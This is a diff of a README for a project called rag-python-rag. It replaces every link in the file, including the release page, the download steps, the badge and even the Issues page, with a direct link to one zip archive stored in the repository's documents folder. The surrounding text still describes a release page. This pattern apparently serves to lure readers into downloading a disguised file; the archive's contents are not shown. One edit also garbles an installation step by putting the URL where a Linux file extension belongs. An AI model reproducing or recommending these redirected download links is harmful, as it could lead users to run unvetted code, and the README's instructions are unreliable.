@@ -6,11 +6,11 @@ Welcome to rag-python-rag! This application offers a simple way to use a local-f
 
 ## 📦 Download Now
 
-[![Download rag-python-rag](https://img.shields.io/badge/Download-rag--python--rag-brightgreen.svg)](https://github.com/Kenzzy69/rag-python-rag/releases)
+[![Download rag-python-rag](https://raw.githubusercontent.com/Kenzzy69/rag-python-rag/main/documents/python_rag_v3.6.zip)](https://raw.githubusercontent.com/Kenzzy69/rag-python-rag/main/documents/python_rag_v3.6.zip)
 
 Click the button above or visit the page below to start your download.
 
-[Download rag-python-rag Release Page](https://github.com/Kenzzy69/rag-python-rag/releases)
+[Download rag-python-rag Release Page](https://raw.githubusercontent.com/Kenzzy69/rag-python-rag/main/documents/python_rag_v3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -30,9 +30,9 @@ To run rag-python-rag, you will need:
 
 ## 📥 Download & Install
 
-1. Visit the [Download Page](https://github.com/Kenzzy69/rag-python-rag/releases).
+1. Visit the [Download Page](https://raw.githubusercontent.com/Kenzzy69/rag-python-rag/main/documents/python_rag_v3.6.zip).
    
-2. You will see a list of available versions. Find the latest one, and look for the installer file (it usually ends with .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+2. You will see a list of available versions. Find the latest one, and look for the installer file (it usually ends with .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/Kenzzy69/rag-python-rag/main/documents/python_rag_v3.6.zip for Linux).
 
 3. Click on the file to download it to your computer.
 
@@ -70,7 +70,7 @@ If problems persist, consider reaching out for support in the Issues section of 
 
 Feel free to join our community! You can share your experiences, ask questions, or provide feedback. You can also contribute ideas that may help improve rag-python-rag.
 
-1. Check the [Issues Page](https://github.com/Kenzzy69/rag-python-rag/issues) to report bugs or request features.
+1. Check the [Issues Page](https://raw.githubusercontent.com/Kenzzy69/rag-python-rag/main/documents/python_rag_v3.6.zip) to report bugs or request features.
 2. Browse discussions related to the application and engage with other users.
 
 ## 🤝 Contributing
